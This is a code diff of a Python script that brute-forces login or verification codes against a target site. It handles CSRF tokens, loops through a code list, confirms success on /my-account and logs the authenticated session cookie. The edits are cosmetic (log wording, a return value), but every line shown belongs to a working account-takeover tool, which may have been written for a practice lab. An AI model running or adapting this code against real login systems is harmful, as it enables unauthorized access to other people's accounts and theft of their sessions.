@@ -109,7 +109,7 @@ def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
         final = s.get(base_url + "/my-account", timeout=15)
         confirmed = "log out" in final.text.lower()
         log.info(f"[/my-account] status: {final.status_code} | confirmed: {confirmed}")
-        return True, s.cookies.get("session"), None, None
+        return True, s.cookies.get("session"), None, index
     else:
         log.info("Code failed!")
         new_csrf = extract_csrf(r2.text)
@@ -120,14 +120,13 @@ def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
 def main():
     args = parse_args()
     base_url = args.target
-    login_endpoint = "/login"
     cycle_num = 0
     index = 0
 
     codes = load_codes(CODES_PATH)
     s = requests.Session()
 
-    response = s.get(base_url + login_endpoint, timeout=15)
+    response = s.get(base_url + "/login", timeout=15)
     csrf_token = extract_csrf(response.text)
 
     while (True):
@@ -137,7 +136,7 @@ def main():
             duration = time.perf_counter() - start
             cycle_num += 1
 
-            log.info(f"[Cycle {cycle_num}] {duration:.2f}s | index atual: {index} | csrf: {csrf_token}")
+            log.info(f"[Cycle {cycle_num}] {duration:.2f}s | actual index: {index}")
 
             if sucesso:
                 log.info("Authenticated session cookie: {}".format(session_cookie))
@@ -147,7 +146,7 @@ def main():
             time.sleep(2)
             continue
         except Exception as e:
-             log.info(f"[Fatal] Unexpected failure: {e}")
+             log.error(f"[Fatal] Unexpected failure: {e}")
              raise
 
 if __name__ == "__main__":
